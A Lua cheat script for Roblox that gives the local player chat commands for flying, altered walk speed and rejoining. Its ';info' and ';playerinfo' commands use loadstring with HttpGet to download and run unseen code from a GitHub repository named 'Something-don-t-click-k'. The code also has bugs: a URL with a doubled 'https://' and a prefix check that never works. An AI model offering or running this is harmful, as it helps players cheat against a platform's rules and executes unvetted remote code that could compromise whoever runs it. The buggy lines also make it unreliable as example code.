-- Services
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")
local TeleportService = game:GetService("TeleportService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- Local Player
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Variables
local flyEnabled = false
local flySpeed = 50
local bodyVelocity, bodyGyro
local flyConnection

-- Notify Function
local function notify(title, text, duration)
    StarterGui:SetCore("SendNotification", {
        Title = title;
        Text = text;
        Duration = duration or 3;
    })
end

-- Enable Flying
local function enableFly(speed)
    if flyEnabled then return end
    flyEnabled = true

    bodyVelocity = Instance.new("BodyVelocity", rootPart)
    bodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
    bodyVelocity.Velocity = Vector3.zero

    bodyGyro = Instance.new("BodyGyro", rootPart)
    bodyGyro.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
    bodyGyro.CFrame = rootPart.CFrame

    flyConnection = RunService.RenderStepped:Connect(function()
        local direction = Vector3.zero
        local cameraCFrame = Workspace.CurrentCamera.CFrame

        if UserInputService:IsKeyDown(Enum.KeyCode.W) then direction += cameraCFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then direction -= cameraCFrame.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then direction -= cameraCFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then direction += cameraCFrame.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then direction += Vector3.new(0, 1, 0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then direction -= Vector3.new(0, 1, 0) end

        if flyEnabled then
            bodyVelocity.Velocity = direction.Unit * speed
            bodyGyro.CFrame = cameraCFrame
        else
            bodyVelocity.Velocity = Vector3.zero
        end
    end)
end

-- Disable Flying
local function disableFly()
    if not flyEnabled then return end
    flyEnabled = false

    if bodyVelocity then bodyVelocity:Destroy() end
    if bodyGyro then bodyGyro:Destroy() end
    if flyConnection then flyConnection:Disconnect() end
end

-- Set Walk Speed
local function setWalkSpeed(speed)
    local newSpeed = tonumber(speed)
    if newSpeed and newSpeed > 0 then
        humanoid.WalkSpeed = newSpeed
        notify("Speed Changed", "Walk speed set to " .. newSpeed, 3)
    else
        notify("Error", "Invalid speed. Example: ;ws 30", 3)
    end
end

-- Rejoin the Game
local function rejoinGame()
    notify("Rejoining", "Teleporting to the current game...", 3)
    TeleportService:Teleport(game.PlaceId)
end

-- List Commands
local function listCommands()
    local commands = [[
Available Commands:
;fly [speed] - Enable flying with optional speed (default 50)
;unfly - Disable flying
;ws, ;speed, ;walkspeed [speed] - Set walk speed
;rejoin, ;rj - Rejoin the game
;cmds - List all available commands
;info - Load external info script
;playerinfo, ;pi - Displays player information
    ]]
    notify("Commands List", "Check the output for full command details.", 5)
    print(commands)
end

-- Load External Info Script
local function executeInfo()
    notify("Executing Info", "Loading external script...", 3)
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/guest433/Something-don-t-click-k/refs/heads/main/starting%20"))()
    end)

    if success then
        notify("Info Loaded", "The external script has been executed.", 3)
    else
        notify("Error", "Failed to load script: " .. tostring(result), 5)
    end
end

-- Chat Command Handler
player.Chatted:Connect(function(message)
    if not message:sub(1, 1) == ";" then return end -- Only process commands with prefix ;
    local args = string.split(message, " ")
    local command = args[1]:lower()

    if command == ";fly" then
        enableFly(tonumber(args[2]) or flySpeed)
        notify("Fly Enabled", "Flying activated.", 3)

    elseif command == ";unfly" then
        disableFly()
        notify("Fly Disabled", "You are no longer flying.", 3)

    elseif command == ";ws" or command == ";speed" or command == ";walkspeed" then
        if args[2] then
            setWalkSpeed(args[2])
        else
            notify("Error", "Specify a speed. Example: ;ws 30", 3)
        end

    elseif command == ";rejoin" or command == ";rj" then
        rejoinGame()

    elseif command == ";cmds" then
        listCommands()

    elseif command == ";info" then
        executeInfo()

    elseif command == ";playerinfo" or command == ";pi" then
        local piScript = loadstring(game:HttpGet("https://https://raw.githubusercontent.com/guest433/Something-don-t-click-k/refs/heads/main/Pi%20player%20infor"))()
        piScript(args)

    else
        notify("Unknown Command", "Use ;cmds to see all commands.", 3)
    end
end)

-- Handle Respawning
player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    humanoid = newCharacter:WaitForChild("Humanoid")
    rootPart = newCharacter:WaitForChild("HumanoidRootPart")
    disableFly() -- Ensure flying is disabled upon respawn
end)
